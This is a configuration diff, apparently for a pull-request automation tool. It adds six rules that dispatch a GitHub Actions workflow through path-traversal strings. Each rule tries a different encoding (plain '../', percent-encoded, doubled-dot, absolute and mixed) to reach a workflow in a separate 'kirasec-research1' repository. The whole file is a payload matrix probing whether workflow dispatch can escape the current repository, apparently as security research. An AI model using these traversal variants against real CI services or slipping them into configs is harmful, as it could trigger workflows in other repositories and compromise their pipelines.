@@ -1,1 +1,61 @@
-pull_request_rules: []
+pull_request_rules:
+  - name: enc-plain
+    conditions:
+      - base=main
+      - label=enc-go
+    actions:
+      github_actions:
+        workflow:
+          dispatch:
+            - workflow: "../../../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
+  - name: enc-pct
+    conditions:
+      - base=main
+      - label=enc-go
+    actions:
+      github_actions:
+        workflow:
+          dispatch:
+            - workflow: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fkirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
+  - name: enc-dotpct
+    conditions:
+      - base=main
+      - label=enc-go
+    actions:
+      github_actions:
+        workflow:
+          dispatch:
+            - workflow: "..%2f..%2f..%2f..%2fkirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
+  - name: enc-quad
+    conditions:
+      - base=main
+      - label=enc-go
+    actions:
+      github_actions:
+        workflow:
+          dispatch:
+            - workflow: "....//....//....//....//kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
+  - name: enc-abs
+    conditions:
+      - base=main
+      - label=enc-go
+    actions:
+      github_actions:
+        workflow:
+          dispatch:
+            - workflow: "/repos/kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
+  - name: enc-mixed
+    conditions:
+      - base=main
+      - label=enc-go
+    actions:
+      github_actions:
+        workflow:
+          dispatch:
+            - workflow: ".././.././.././.././kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
